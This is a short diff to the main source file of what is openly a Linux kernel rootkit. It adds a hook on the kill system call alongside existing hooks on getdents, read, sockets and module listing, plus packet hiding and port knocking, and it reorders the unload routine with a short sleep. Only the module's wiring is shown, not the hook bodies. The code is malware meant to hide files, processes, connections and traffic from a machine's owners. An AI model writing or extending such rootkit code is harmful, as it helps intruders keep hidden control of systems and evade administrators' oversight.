@@ -26,6 +26,7 @@
 
 #include "control.h"
 #include "getdents.h"
+#include "kill.h"
 #include "hide_packet.h"
 #include "hide_socket.h"
 #include "include.h"
@@ -52,6 +53,7 @@ int init_module (void)
 	
 	initialize_control();
 	hook_getdents();	
+	hook_kill();	
 	hook_sockets();
 	hook_read();
 	load_packet_hiding();
@@ -91,13 +93,17 @@ void cleanup_module (void)
 	// TODO: adapt all unload functions to only do something if they are loaded
 	
 
+	cleanup_control();
 	unload_packet_hiding();
-	unhook_getdents();
 	unhook_sockets();
 	unhook_read();
 	unhook_modules();
 	unload_port_knocking();
-	cleanup_control();
+	unhook_getdents();
+	unhook_kill();
+
+	/* sleep for a bit to ensure all processes have left our functions */
+	msleep(500);
 	
 	/* Finally, log the unloading */
 	ROOTKIT_DEBUG("****************************************\n");	
